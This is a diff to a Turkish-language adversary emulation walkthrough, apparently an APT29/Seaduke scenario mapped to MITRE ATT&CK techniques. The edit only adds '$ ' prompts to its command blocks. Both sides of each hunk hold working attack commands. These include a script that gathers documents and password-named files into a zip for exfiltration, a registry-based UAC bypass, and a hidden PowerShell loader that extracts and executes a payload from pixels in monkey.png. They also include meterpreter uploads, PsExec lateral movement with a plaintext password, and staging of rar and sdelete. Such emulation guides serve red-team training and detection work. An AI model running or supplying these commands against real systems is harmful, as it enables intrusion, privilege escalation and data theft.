@@ -95,7 +95,7 @@ Saldırgan, dosya sisteminde belge ve medya dosyaları aramak ([T1083](https://a
 [pupy (PowerShell)] >
 
 ```powershell
-$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
+$ $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
 ```
 
 [pupy (PowerShell)] > `exit`
@@ -133,23 +133,23 @@ Pupy üzerinden, monkey.png dosyası hedefe yüklenir:
 [pupy (PowerShell)] >
 
 ```powershell
-New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
-New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
-New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
-New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;
-Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)"
+$ New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
+$ New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
+$ New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
+$ New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;
+$ Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)"
 ```
 
 Prompt giriş beklediğinde saldırgan, aşağıdaki 1-liner'ı yazar:
 
 ```powershell
-powershell.exe -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\username\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"
+$ powershell.exe -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\username\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"
 ```
 
 [pupy (PowerShell)] >
 
 ```powershell
-Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Force
+$ Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Force
 ```
 
 Prompt giriş beklediğinde saldırgan Enter'a basar:
@@ -189,7 +189,7 @@ Saldırgan Metasploit içinden SysinternalsSuite.zip dosyasını hedefe iletir v
 [meterpreter\*] >
 
 ```powershell
-upload SysinternalsSuite.zip "C:\\Users\\username\\Downloads\\SysinternalsSuite.zip"
+$ upload SysinternalsSuite.zip "C:\\Users\\username\\Downloads\\SysinternalsSuite.zip"
 ```
 
 [meterpreter\*] > `execute -f powershell.exe -i -H`
@@ -197,13 +197,13 @@ upload SysinternalsSuite.zip "C:\\Users\\username\\Downloads\\SysinternalsSuite.
 [meterpreter (PowerShell)\*] >
 
 ```powershell
-Expand-Archive -LiteralPath "$env:USERPROFILE\Downloads\SysinternalsSuite.zip" -DestinationPath "$env:USERPROFILE\Downloads\"
+$ Expand-Archive -LiteralPath "$env:USERPROFILE\Downloads\SysinternalsSuite.zip" -DestinationPath "$env:USERPROFILE\Downloads\"
 ```
 
 [meterpreter (PowerShell)\*] >
 
 ```powershell
-if (-Not (Test-Path -Path "C:\Program Files\SysinternalsSuite")) { Move-Item -Path $env:USERPROFILE\Downloads\SysinternalsSuite -Destination "C:\Program Files\SysinternalsSuite" }
+$ if (-Not (Test-Path -Path "C:\Program Files\SysinternalsSuite")) { Move-Item -Path $env:USERPROFILE\Downloads\SysinternalsSuite -Destination "C:\Program Files\SysinternalsSuite" }
 ```
 
 [meterpreter (PowerShell)\*] > `cd "C:\Program Files\SysinternalsSuite\"`
@@ -335,7 +335,7 @@ Meterpreter shell'ine dön:
 [meterpreter (PowerShell)\*] >
 
 ```powershell
-Invoke-Command -ComputerName <victim 2 IP> -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like "*\$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId
+$ Invoke-Command -ComputerName <victim 2 IP> -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like "*\$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId
 ```
 
 Adım 8.3. için Session ID'yi kaydet!
@@ -359,7 +359,7 @@ Hazırdaki Meterpreter oturumuna dön:
 [meterpreter (PowerShell)\*] >
 
 ```powershell
-.\PsExec64.exe -accepteula \\<victim 2 IP> -u "domainName\username" -p P@ssw0rd -i <session ID from 8A> "C:\Windows\Temp\python.exe"
+$ .\PsExec64.exe -accepteula \\<victim 2 IP> -u "domainName\username" -p P@ssw0rd -i <session ID from 8A> "C:\Windows\Temp\python.exe"
 ```
 
 Yeni Metasploit terminaline bağlantı gelir.
@@ -381,13 +381,13 @@ Saldırgan, belge ve medya dosyaları ([T1083](https://attack.mitre.org/techniqu
 [meterpreter\*] >
 
 ```cmd
-upload "/home/gfawkes/Round2/Day1/payloads/r2d1/Seaduke/rar.exe" "C:\\Windows\\Temp\\Rar.exe"
+$ upload "/home/gfawkes/Round2/Day1/payloads/r2d1/Seaduke/rar.exe" "C:\\Windows\\Temp\\Rar.exe"
 ```
 
 [meterpreter\*] >
 
 ```cmd
-upload "sdelete64.exe" "C:\\Windows\\Temp\\sdelete64.exe"
+$ upload "sdelete64.exe" "C:\\Windows\\Temp\\sdelete64.exe"
 ```
 
 #### 9.2. Collection and Exfiltration ([T1005](https://attack.mitre.org/techniques/T1005/), [T1041](https://attack.mitre.org/techniques/T1041/), [T1002](https://attack.mitre.org/versions/v6/techniques/T1002/), [T1022](https://attack.mitre.org/versions/v6/techniques/T1022/) / [T1560.001](https://attack.mitre.org/techniques/T1560/001/))
@@ -397,7 +397,7 @@ upload "sdelete64.exe" "C:\\Windows\\Temp\\sdelete64.exe"
 [meterpreter (PowerShell)\*] >
 
 ```powershell
-$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force
+$ $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force
 ```
 
 [meterpreter (PowerShell)\*] > `cd C:\Windows\Temp`
